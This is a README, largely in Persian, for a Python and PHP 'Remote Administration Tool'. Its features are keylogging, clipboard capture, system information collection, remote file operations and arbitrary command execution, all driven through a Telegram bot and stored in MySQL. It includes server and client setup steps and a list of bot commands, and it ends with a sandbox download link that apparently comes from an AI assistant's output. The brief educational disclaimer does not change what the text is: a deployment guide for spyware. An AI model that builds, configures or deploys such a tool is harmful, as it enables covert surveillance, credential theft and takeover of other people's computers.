# Remote Administration Tool (RAT) Project

## Overview
این پروژه یک ابزار کنترل از راه دور (RAT) است که به منظور نشان دادن توانایی‌های نظارت و کنترل سیستم از راه دور طراحی شده است. این پروژه شامل یک کلاینت مبتنی بر پایتون و یک سرور مبتنی بر PHP است که از طریق شبکه برای انجام وظایفی مانند ضبط ضربات کیبورد، جمع‌آوری اطلاعات سیستم، مدیریت فایل و اجرای دستورات از راه دور با یکدیگر ارتباط برقرار می‌کنند. سرور برای صدور دستورات و بازیابی داده‌ها از Telegram بهره می‌برد و از یک پایگاه داده MySQL برای ذخیره‌سازی استفاده می‌کند.

> **توجه:** این پروژه صرفاً برای مقاصد آموزشی و پژوهشی است. استفاده غیرمجاز از این ابزارها روی سیستم‌ها بدون اجازه صریح، غیرقانونی و غیراخلاقی است.

## ساختار پروژه
```
├── commands
│   └── handler.py           # مدیریت عملیات فایل و دستورات سیستمی
├── config.py                # تنظیمات کلاینت
├── encryption
│   └── manager.py           # مدیریت رمزنگاری AES
├── main.py                  # اسکریپت اصلی کلاینت برای ضبط و ارتباط
├── monitoring
│   └── logger.py            # ثبت ضربات کیبورد و محتویات کلیپ‌بورد
├── network
│   └── communicator.py      # مدیریت ارتباط با سرور
├── output
│   └── project_structure_1.txt  # خروجی ساختار پروژه
├── readme.md                # همین فایل
├── system
│   └── collector.py         # جمع‌آوری اطلاعات سیستم
└── telegram
    ├── api.php              # API سرور برای مدیریت درخواست‌های کلاینت
    ├── config.php           # تنظیمات سرور
    ├── crypto.php           # رمزنگاری سمت سرور
    ├── database.sql         # اسکیما پایگاه داده
    ├── import_sql.php       # اسکریپت وارد کردن اسکیما
    ├── output
    │   └── project_structure_1.txt  # خروجی ساختار پروژه
    ├── telegram_handler.php # مدیریت تعامل با بات تلگرام
    └── utils.php            # توابع کمکی سرور
```

## ویژگی‌ها

- **ضبط ضربات کیبورد:** ثبت ضربات و محتویات کلیپ‌بورد و ارسال دوره‌ای به سرور.
- **نظارت سیستم:** جمع‌آوری اطلاعات سیستم (OS، سخت‌افزار، شبکه و غیره).
- **دستورات از راه دور:** پشتیبانی از عملیات فایل (حذف، دانلود، آپلود)، کنترل سیستم (خاموش، راه‌اندازی مجدد) و مدیریت فرآیندها.
- **رمزنگاری:** ارتباط ایمن با استفاده از AES-256-CBC.
- **ادغام با Telegram:** تعامل از طریق بات تلگرام با دستورهای خاص.
- **ذخیره‌سازی در پایگاه داده:** ثبت داده‌ها، دستورات و لاگ‌ها در MySQL.

## پیش‌نیازها

### کلاینت (Python)
- Python 3.8+
- بسته‌های مورد نیاز:
  ```bash
  pip install requests pyperclip psutil cryptography keyboard winreg uuid
  ```

### سرور (PHP)
- PHP 7.4+
- MySQL 5.7+ یا MariaDB
- وب‌سرور (Apache/Nginx)
- اکستنشن‌های PHP:
  - pdo_mysql
  - openssl
  - curl
- **توکن بات تلگرام** (از BotFather)

## مراحل راه‌اندازی

### راه‌اندازی سرور

1. **تنظیم وب‌سرور:**  
   فایل‌های PHP را در دایرکتوری `telegram` در دسترس قرار دهید.

2. **ساخت پایگاه داده:**  
   ```
   CREATE DATABASE farhamag_logger;
   ```
   و اسکیما را با:
   ```bash
   php telegram/import_sql.php
   ```

3. **تنظیمات بات تلگرام:**  
   توکن و شناسه ادمین را در `telegram/config.php` وارد کنید.  
   ```php
   public static $BOT_TOKEN = "your_bot_token";
   public static $ADMIN_CHAT_ID = "your_admin_chat_id";
   ```  
   راه‌اندازی Webhook:
   ```bash
   curl -F "url=https://your_server_url/logger/api.php?action=telegram_webhook" https://api.telegram.org/bot<your_bot_token>/setWebhook
   ```

4. **دسترسی‌ها:**  
   پوشه‌های `screenshots` و `uploads` و همچنین لاگ‌ها باید قابلیت نوشتن داشته باشند.

### راه‌اندازی کلاینت

1. **تنظیمات کلاینت:**  
   در `config.py`:
   ```python
   SERVER_URL = "https://your_server_url/logger/api.php"
   ENCRYPTION_KEY = base64.b64decode("your_base64_key")
   ```

2. **نصب وابستگی‌ها:**  
   ```bash
   pip install -r requirements.txt
   ```

## اجرای پروژه

### اجرای کلاینت
```bash
python main.py
```
- شروع ضبط ضربات کیبورد و کلیپ‌بورد
- ارسال و دریافت دستورات دوره‌ای
- خروج با کلید میانبر `Ctrl+Alt+Shift+K`

### تعامل از طریق Telegram
دستورات اصلی:
```
/start, /screens, /logs, /browse, /get-info, /shutdown, /restart, /sleep, /signout, /cmd <command>, /go <url>, /users, /startup, /tasks
```

## نکات امنیتی
- **رمزنگاری:** استفاده از AES-256-CBC برای ارتباط امن.
- **توکن و ID ادمین:** فقط ادمین مجاز به استفاده است.
- **SSL:** برای ارتباط امن HTTPS فعال کنید.

---

[Download the markdown file](sandbox:/mnt/data/remote_admin_tool.md)
